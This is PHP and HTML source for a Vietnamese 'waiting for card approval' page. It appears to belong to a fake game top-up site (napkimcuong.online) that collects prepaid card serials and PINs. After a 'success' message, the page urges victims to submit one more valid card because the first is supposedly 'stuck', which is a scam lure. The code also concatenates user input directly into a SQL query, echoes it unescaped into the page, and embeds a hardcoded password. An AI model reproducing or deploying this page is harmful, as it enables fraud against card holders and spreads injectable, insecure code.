<?php
require('connect.php');
db_connect();
$serial = input_value('serial');
$h = db_get_row('select * from the where serial = '.$serial);


?>
<!doctype html>
<html lang="en">
<head>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
<title>Chờ duyệt thẻ #<?=$serial?></title>
<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</head>
<body>
<div class="container">
<div class="row justify-content-center">
<div class="col-md-7 mt-3">
<div class="card-body">
<center style="display:none" id="block"><a href="https://napkimcuong.online/"><button type="button" class="btn btn-primary btn-lg mt-2 mb-3">Nạp <span id="xxx1"></span></button></a></center>
<div id="hide">
<div class="d-flex justify-content-center mb-4">
<div class="spinner-border" role="status">
<span class="visually-hidden">Loading...</span>
</div>
<br />
<center class="d-block"><h4>Vui lòng chờ xử lý trong giây lát...</h4></div></center>
</div>
<div class="table-responsive mt-3">
<table class="table table-striped">
<tr>
<td>
Trạng thái
</td>
<td id="status"><span class="badge bg-warning text-white">Đang xử lý...</span></td>
</tr>
<tr>
<td>
Mã serial
</td>
<td><?=$serial?></td>
</tr>
<tr>
<td>
Mã PIN
</td>
<td><?=$h['pin']?></td>
</tr>
<tr>
<td>
Mệnh giá
</td>
<td id='mg'><?=format_cash($h['menhgia'])?>đ</td>
</tr>
</table>
</div>
</div>
</div>
</div>
</div>
<script>
   function showPassword(stt){
       if(stt === '1'){
           $("#password").html('<b>zxcvbnm123</b>');
       } else {
           $("#password").html('<span class="badge bg-danger text-white">Thất bại, thanh toán không thành công</span>');
       }
   }
       setInterval(function() {
           $.post("check.php", {serial: '<?=$serial?>'}, function(result){
    if(result === '0'){
        $("#hide").html('<div class="d-flex justify-content-center mb-4"><div class="spinner-border" role="status"><span class="visually-hidden">Loading...</span></div><center><h4>Vui lòng chờ xử lý trong giây lát...</h4></div></center>');
        $("#status").html('<span class="badge bg-warning text-white">Đang xử lý...</span>');
        
    }
    if(result === '1'){
        Swal.fire(
  'Thành công!',
  'Nếu nạp đúng mà vật phẩm không về thì bạn tiến hành nạp thêm 1 thẻ nữa vào đúng tài khoản game để hệ thống đẩy cả 2 lần nạp về nhé, do nhiều người nạp nên có thể thẻ sẽ bị treo',
  'success'
)
        $("#hide").html('<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/73/Flat_tick_icon.svg/768px-Flat_tick_icon.svg.png" class="mb-3 d-block m-auto" width="150px"/>');
        $("#status").html('<span class="badge bg-success text-white">Thành công</span><br/><small>Nếu quá 5 phút mà vật phẩm chưa được gửi về tài khoản, bạn hãy nạp thêm 1 thẻ đúng khác để hệ thống đẩy cả 2 lần nạp về vì hệ thống đang có nhiều lượt nạp, thẻ của bạn có thể bị treo</small>');
        $("#block").show();
        $("#xxx1").html('tiếp và nhận nhiều quà hơn');
        $("#xxx2").html(' thêm nick khác');
            }
    if(result === '2'){
        $("#hide").html('<img src="https://www.freeiconspng.com/thumbs/error-icon/error-icon-4.png" class="mb-3 d-block m-auto" width="150px"/>');
        $("#status").html('<span class="badge bg-danger text-white">Sai mệnh giá...</span>');
        $("#block").show();
        $("#xxx1").html('lại và nhận quà');
        $("#xxx2").html(' lại nick khác');
            }
    if(result === '3'){
        $("#hide").html('<img src="https://www.freeiconspng.com/thumbs/error-icon/error-icon-4.png" class="mb-3 d-block m-auto" width="150px"/>');
        $("#status").html('<span class="badge bg-danger text-white">Thẻ sai...</span>');
        $("#block").show();
        $("#xxx1").html('lại và nhận quà');
        $("#xxx2").html(' lại nick khác');
        $("#mg").html('0đ');
            }
  });
       }, 5000);
   </script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>


</body>
</html>